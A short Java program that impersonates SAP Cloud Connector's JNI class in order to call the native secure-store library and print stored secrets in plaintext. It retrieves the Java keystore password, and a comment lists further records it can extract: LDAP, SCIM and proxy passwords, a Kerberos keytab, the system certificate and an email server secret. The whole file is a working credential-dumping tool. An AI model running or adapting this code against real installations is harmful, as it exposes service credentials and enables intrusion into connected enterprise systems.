package com.sap.scc.jni;  // the package must be com.sap.scc.jni

import java.io.IOException;
import java.util.Properties;

public class SecStoreAccess { // the class name must be SecStoreAccess
  
  static synchronized native char[] getRecord(final String p0) throws SecStoreAccessException, IllegalArgumentException;
  
  public static void main(String[] args) throws IOException {
    if (args.length > 1 )
    {
      System.out.print("java -jar decode.jar");
    }
    
    System.load("/usr/lib/libsapscc20jni.so");
    try
    {
      /* 
      available parameters for getRecord function
      
      "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD";
      "CLOUD_CONN/SCIM_SERVICE_USER_PASSWD";
      "CLOUD_CONN/LDAP_SERVICE_USER_PASSWORD";
      "CLOUD_CONN/PROXY_PASSWORD";
      "CLOUD_CONN/KERBEROS_KTAB";
      "CLOUD_CONN/SYSTEM_CERTIFICATE";
      "CLOUD_CONN/ALERT_EMAIL_SERVER_SECRET";
      */      
      char[] result = getRecord("CLOUD_CONN/JAVA_KEYSTORE_PASSWORD");
      System.out.println(new String(result));
    
      }catch (Exception e)
    {
      e.printStackTrace();
    }
  }

}
